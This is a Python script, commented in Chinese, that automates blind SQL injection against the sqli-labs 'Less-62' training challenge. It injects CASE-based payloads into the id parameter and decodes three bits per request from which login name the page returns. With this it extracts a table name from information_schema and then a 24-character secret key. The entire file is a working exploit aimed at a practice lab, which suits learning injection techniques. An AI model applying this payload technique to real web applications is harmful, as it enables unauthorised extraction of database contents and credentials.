import requests
import re


'''
mysql查询中，字符串比对是忽略大小写，from 后面跟着的需要匹配大小写。
ascii值中，数字范围是48-57，还不需要第7位为1，
大写字母是65-90，小写字母是97-122
加上表名都是大写，因此才能用这种方式。

一共要使用7位， 64 32 16 8 4 2 1
数字需要使用低6位。而第6位一定为1。第7位为0  0100xxx,0101xxx,0110xxx,  0111xxx(32+16+8,超过数字值)
而如果字母只用大写，那么只需要第7位必须为1，然后第6位非1，1000xxx,1001xxx,1010xxx,1011xxx,

'''

url = "http://192.168.217.140/sqli-labs/Less-62/?id="
global try_count
try_count = 0



def extract_bits(query, i, bit_values: list):
    global try_count
    
    assert len(bit_values) == 8
    bit_marks = 0
    for v in bit_values:
        bit_marks |= v
        
    payload = '''
    '+(
SELECT CASE ASCII(SUBSTRING(({query}), {i}, 1)) & ({bit_mark})
    WHEN {0} THEN 1
    WHEN {1} THEN 2
    WHEN {2} THEN 3
    WHEN {3} THEN 4
    WHEN {4} THEN 5
    WHEN {5} THEN 6
    WHEN {6} THEN 7
    ELSE 8
END
    )+'
    '''.format(*bit_values[:7],query=query,bit_mark=bit_marks,i=i)
    payload = re.sub(r'\s+',' ',payload.strip().replace("\n"," "))
    
    resp = requests.get(url, params={"id": payload})
    try_count += 1
    
    infos = ["Angelina", "Dummy", "secure", "stupid", "superman", "batman", "admin", "admin1"]
    
    match = re.search(r"Your Login name : (.*?)<br>", resp.text)
    assert match
    assert match.group(1) in infos
    bits = bit_values[infos.index(match.group(1))]
    return bits


def extract_data(query,length):
    res = ""
    for i in range(1,length+1):
        b2 = extract_bits(query, i, [0b00000000, 0b00000001, 0b00000010, 0b00000011, 0b00000100, 0b00000101, 0b00000110, 0b00000111])  # 00000111
        b1 = extract_bits(query, i, [0b00000000, 0b00001000, 0b00010000, 0b00011000, 0b01000000, 0b01001000, 0b01010000, 0b01011000])  # 01011000
        if b1 & 0b01000000 == 0:
            # 数字
            bit = b1 | b2 | 0b00100000
        else:
            # 字符
            bit = b1 | b2
        res += chr(bit)
    return res


p1 = "select table_name from information_schema.TABLES where TABLE_SCHEMA='challenges' limit 1"
table_name = extract_data(p1,10)

p2 = "select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x" % table_name
secret_key = extract_data(p2,24)
        
print("Done. try_count:", try_count)